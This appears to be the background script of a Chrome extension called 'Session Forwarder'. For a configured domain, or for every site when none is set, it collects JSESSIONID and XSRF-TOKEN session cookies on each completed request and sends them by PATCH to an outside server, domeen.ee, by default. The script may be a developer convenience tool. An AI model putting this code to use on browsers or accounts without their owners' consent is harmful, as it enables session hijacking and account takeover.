const DEFAULT_ENDPOINT = "https://domeen.ee/patchSession";

let config = {
    enabled: false,
    monitoredDomain: "",
    endpoint: DEFAULT_ENDPOINT
};

const lastSent = {};

chrome.storage.local.get(["enabled", "monitoredDomain", "endpoint"]).then(res => {
    config.enabled = !!res.enabled;
    config.monitoredDomain = res.monitoredDomain || "";
    config.endpoint = res.endpoint || DEFAULT_ENDPOINT;
});

chrome.storage.onChanged.addListener((changes, area) => {
    if (area === "local") {
        if (changes.enabled) {
            config.enabled = changes.enabled.newValue;
        }

        if (changes.monitoredDomain) {
            config.monitoredDomain = changes.monitoredDomain.newValue || "";
        }

        if (changes.endpoint) {
            config.endpoint = changes.endpoint.newValue || DEFAULT_ENDPOINT;
        }
    }
});

function isMonitored(monitoredUrl) {
    if (!config.monitoredDomain || config.monitoredDomain.trim() === "") {
        return true;
    }

    try {
        const url = new URL(monitoredUrl);
        const host = url.hostname;
        const domain = config.monitoredDomain.trim().toLowerCase();

        return host === domain || host.endsWith("." + domain);
    } catch (e) {
        return false;
    }
}

chrome.webRequest.onCompleted.addListener(async (details) => {
        try {
            if (!config.enabled) {
                return;
            }

            if (!isMonitored(details.url)) {
                return;
            }

            const url = details.url;
            const cookies = await chrome.cookies.getAll({url});

            const jsession = cookies.find(c => c.name === "JSESSIONID");
            const xsrf = cookies.find(c => c.name === "XSRF-TOKEN");
            const expiryCookie = cookies.find(c => c.name === "sessionExpiry");

            const jsessionVal = jsession ? jsession.value : null;
            const xsrfVal = xsrf ? xsrf.value : null;
            const sessionExpiryVal = expiryCookie ? (isNaN(Number(expiryCookie.value)) ? null : Number(expiryCookie.value)) : null;

            if (!jsessionVal && !xsrfVal) {
                return;
            }

            let hostname;

            try {
                hostname = (new URL(url)).hostname;
            } catch (e) {
                hostname = details.initiator || "unknown";
            }

            if (lastSent[hostname] && lastSent[hostname] === jsessionVal) {
                console.log(`${hostname} session already sent, skipping.`);

                // return;
            }

            const payload = {
                sessionId: jsessionVal,
                xsrfToken: xsrfVal,
                sessionExpiry: sessionExpiryVal,
                sourceUrl: url,
                detectedAt: Date.now()
            };

            try {
                const endpoint = config.endpoint || DEFAULT_ENDPOINT;

                await fetch(endpoint, {
                    method: "PATCH",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify(payload)
                });

                console.log("[Session Forwarder] Sent session to", endpoint, payload);

                chrome.storage.local.set({sentResTime: Date.now()});

                if (jsessionVal) {
                    lastSent[hostname] = jsessionVal;
                }
            } catch (e) {
                console.error("[Session Forwarder] Failed to send PATCH:", e);
            }
        } catch (err) {
            console.error("[Session Forwarder] Listener error:", err);
        }
    },
    {urls: ["<all_urls>"]},
    []);
